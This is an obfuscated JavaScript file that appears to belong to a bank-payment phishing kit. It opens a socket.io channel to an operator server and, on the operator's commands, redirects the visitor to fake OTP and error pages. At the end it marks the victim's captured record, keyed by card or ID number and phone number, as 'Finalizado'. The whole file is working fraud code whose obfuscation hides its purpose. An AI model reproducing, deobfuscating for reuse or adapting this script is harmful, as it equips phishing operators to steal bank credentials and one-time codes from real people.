const _0x154b22 = _0x234f;
function _0x3167() {
  const _0x5a5d5b = [
    "98849kYxSkZ",
    "finish",
    "8keooCz",
    "valid",
    "newdin",
    "connect",
    "143UWLzmY",
    "valor",
    "log",
    "telnum",
    "1632wyaJrt",
    "1818936iXzEaH",
    "application/json",
    "/logs/logs",
    "1412XcruBo",
    "href",
    "./errorPse.html",
    "json",
    "location",
    "16128KDLyhZ",
    "/logs/logFinish/",
    "2085648plOKRu",
    "logs",
    "9AOWEme",
    "1725bPZCRY",
    "metaInfo",
    "Usuario\x20encontrado",
    "1830680piKgGF",
    "Finalizado",
    "3417585ClPDvR",
    "GET",
  ];
  _0x3167 = function () {
    return _0x5a5d5b;
  };
  return _0x3167();
}
function _0x234f(_0x252ef5, _0x125f05) {
  const _0x3167a4 = _0x3167();
  return (
    (_0x234f = function (_0x234fb4, _0x3f1c6e) {
      _0x234fb4 = _0x234fb4 - 0x1ef;
      let _0x226c9a = _0x3167a4[_0x234fb4];
      return _0x226c9a;
    }),
    _0x234f(_0x252ef5, _0x125f05)
  );
}
(function (_0x3fbf9e, _0x5b5c4b) {
  const _0x4d6395 = _0x234f,
    _0x1611a4 = _0x3fbf9e();
  while (!![]) {
    try {
      const _0x1b53d8 =
        (-parseInt(_0x4d6395(0x1f7)) / 0x1) *
          (parseInt(_0x4d6395(0x1f9)) / 0x2) +
        (-parseInt(_0x4d6395(0x1f0)) / 0x3) *
          (-parseInt(_0x4d6395(0x205)) / 0x4) +
        -parseInt(_0x4d6395(0x1f5)) / 0x5 +
        (parseInt(_0x4d6395(0x201)) / 0x6) *
          (-parseInt(_0x4d6395(0x20a)) / 0x7) +
        (parseInt(_0x4d6395(0x202)) / 0x8) *
          (-parseInt(_0x4d6395(0x1ef)) / 0x9) +
        -parseInt(_0x4d6395(0x1f3)) / 0xa +
        (-parseInt(_0x4d6395(0x1fd)) / 0xb) *
          (-parseInt(_0x4d6395(0x20c)) / 0xc);
      if (_0x1b53d8 === _0x5b5c4b) break;
      else _0x1611a4["push"](_0x1611a4["shift"]());
    } catch (_0x18a313) {
      _0x1611a4["push"](_0x1611a4["shift"]());
    }
  }
})(_0x3167, 0x54917);
var socket = io[_0x154b22(0x1fc)](url);
socket["on"](_0x154b22(0x20d), function (_0x356a07) {
  const _0xd3f0b = _0x154b22;
  if (
    _0x356a07[_0xd3f0b(0x1fe)] == "us" &&
    _0x356a07[_0xd3f0b(0x1fa)] == info[_0xd3f0b(0x1f1)][_0xd3f0b(0x200)]
  )
    window[_0xd3f0b(0x209)][_0xd3f0b(0x206)] = "./index.error.html";
  else {
    if (
      _0x356a07[_0xd3f0b(0x1fe)] == "din" &&
      _0x356a07[_0xd3f0b(0x1fa)] == info[_0xd3f0b(0x1f1)][_0xd3f0b(0x200)]
    )
      window[_0xd3f0b(0x209)][_0xd3f0b(0x206)] = "./otp.html";
    else {
      if (
        _0x356a07[_0xd3f0b(0x1fe)] == _0xd3f0b(0x1fb) &&
        _0x356a07[_0xd3f0b(0x1fa)] == info[_0xd3f0b(0x1f1)][_0xd3f0b(0x200)]
      )
        window[_0xd3f0b(0x209)][_0xd3f0b(0x206)] = "./otp.error.html";
      else {
        if (
          _0x356a07[_0xd3f0b(0x1fe)] == _0xd3f0b(0x1f8) &&
          _0x356a07[_0xd3f0b(0x1fa)] == info["metaInfo"]["telnum"]
        ) {
          async function _0x105908() {
            const _0x1b33af = _0xd3f0b,
              _0x2e8ae9 = await fetch(url + _0x1b33af(0x204), {
                method: _0x1b33af(0x1f6),
                headers: { "Content-Type": "application/json" },
              }),
              _0x482c5f = await _0x2e8ae9[_0x1b33af(0x208)](),
              _0x58f28e = [..._0x482c5f];
            for (const _0x16727e of _0x58f28e) {
              if (
                _0x16727e["reg"] == info[_0x1b33af(0x1f1)]["cc"] &&
                _0x16727e["cl"] == info["metaInfo"][_0x1b33af(0x200)]
              ) {
                console[_0x1b33af(0x1ff)](_0x1b33af(0x1f2));
                const _0xeea6f4 = await fetch(
                    url + _0x1b33af(0x20b) + _0x16727e["idreg"],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0x1b33af(0x203) },
                      body: JSON["stringify"]({ status: _0x1b33af(0x1f4) }),
                    }
                  ),
                  _0x1d3201 = await _0xeea6f4[_0x1b33af(0x208)]();
              }
            }
            window[_0x1b33af(0x209)][_0x1b33af(0x206)] = _0x1b33af(0x207);
          }
          _0x105908();
          return;
        }
      }
    }
  }
});
